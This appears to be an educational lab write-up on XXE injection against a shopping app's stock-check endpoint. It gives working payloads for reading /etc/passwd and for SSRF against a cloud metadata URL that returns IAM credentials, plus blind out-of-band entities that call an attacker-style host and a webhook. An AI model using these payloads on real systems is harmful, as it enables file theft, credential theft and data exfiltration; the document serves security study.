<h1>Exploiting XML External Entity (XXE) Vulnerabilities - FOR EDUCATIONAL PURPOSES ONLY</h1>

<h2>How To Find And Test For XXE Vulnerabilities</h2>

The vast majority of XXE vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner. Manually testing for XXE vulnerabilities generally involves:

<ul>
  <li>Testing for <b>file retrieval</b> by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response.</li>
  <li>Testing for <b>blind XXE vulnerabilities</b> by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. Burp Collaborator is perfect for this purpose.</li>
  <li>Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an <b>XInclude</b> attack to try to retrieve a well-known operating system file.</li>
</ul>

<h2>Exploiting XXE to retrieve files</h2>

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

<ol>
  <li>Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.</li>
  <li>Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity</li>
</ol>

For example, a shopping application sends XML data to the server when checking the stock of grocery items.

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

To exploit the XXE and retrieve the /etc/passwd file, we must modify the XML to this:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

This XXE payload defines an external entity &xxe; whose value is the contents of the /etc/passwd file and uses the entity within the productId value.
This causes the application's response to include the contents of the /etc/passwd file

<h3>Example(s) Of Using XXE To Retrieve Files</h3>

Scenario 1: Web Application sends XML data to server to check the stock of items sold on the website. 

<img width="1260" height="348" alt="xxe-injection-stock-checker-browser" src="https://github.com/user-attachments/assets/eeb0a51f-aab5-43f7-bbf0-a8d6394d3f02" />

Below is the POST request to the /product/stock endpoint that is sent when users check the stock of an item.

```
POST /product/stock HTTP/2
Host: 0a7c00e404952062de953eee0026007c.web-security-academy.net
Cookie: session=bs0zDqdFU7IOVKqN2SN4GTPnbFXteD87
Content-Type: application/xml
Content-Length: 107

<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
  </stockCheck>
```

If there are no defenses in place, then sending the following request will make the server reply with the content of the /etc/passwd file.

```
POST /product/stock HTTP/2
Host: 0a7c00e404952062de953eee0026007c.web-security-academy.net
Cookie: session=bs0zDqdFU7IOVKqN2SN4GTPnbFXteD87
Content-Length: 189
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

<img width="1416" height="612" alt="xxe-injection-stock-checker-read-etc-passwd-file-burpsuite" src="https://github.com/user-attachments/assets/1b4b9db5-90d5-427f-952e-1b924c341479" />


<h2>Exploiting XXE For SSRF</h2>

Aside from retrieval of sensitive data, the other main impact of XXE attacks is that they can be used to perform server-side request forgery (SSRF). This is a potentially serious vulnerability in which the server-side application can be induced to make HTTP requests to any URL that the server can access.

To exploit an XXE vulnerability to perform an SSRF attack, you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system. If not, then you will only be able to perform blind SSRF attacks (which can still have critical consequences).

In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

<h3>Examples Of Using XXE For SSRF</h3>

Scenario 1: Web Application sends XML data to server to check the stock of items sold on the website.

<img width="1543" height="258" alt="xxe-injection-stock-checker-browser-ssrf" src="https://github.com/user-attachments/assets/0a6b3d50-49c7-470e-8219-ebdd229a96ef" />


```
POST /product/stock HTTP/2
Host: 0a740027046c804482c9a66d00ba00b3.web-security-academy.net
Cookie: session=tNrXUoaiGqmdN2BOwoBRjRLVKUvhMgIF
User-Agent: Mozilla/5.0
Content-Type: application/xml
Content-Length: 242

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ssrf [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

<img width="1910" height="665" alt="xxe-ssrf-burpsuite" src="https://github.com/user-attachments/assets/157e98ad-6f4c-4253-968c-1028afd3371d" />


<h2>Blind XXE Injection</h2>

Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.

There are two broad ways in which you can find and exploit blind XXE vulnerabilities:

<ul>
  <li>You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.</li>
  <li>You can trigger XML parsing errors in such a way that the error messages contain sensitive data.</li>
</ul>

<h3>Blind XXE With Out-Of-Band Interaction</h3>

You can often detect blind XXE using the same technique as for XXE SSRF attacks but triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

```
POST /stock HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0
Content-Type: application/xml
Content-Length: 223

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://webhook.site/REDACTED"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

After sending the above request, we see a request made to your webhook. See images below.

<img width="1415" height="662" alt="blind-xxe-outbound-request-to-webhook" src="https://github.com/user-attachments/assets/b12c7abc-bada-47bd-8fbf-3bc9108d8b9b" />

<img width="1552" height="587" alt="blind-xxe-outbound-request-to-webhook-2" src="https://github.com/user-attachments/assets/ad3f005e-03a1-47ff-b70c-0511bbf970a5" />

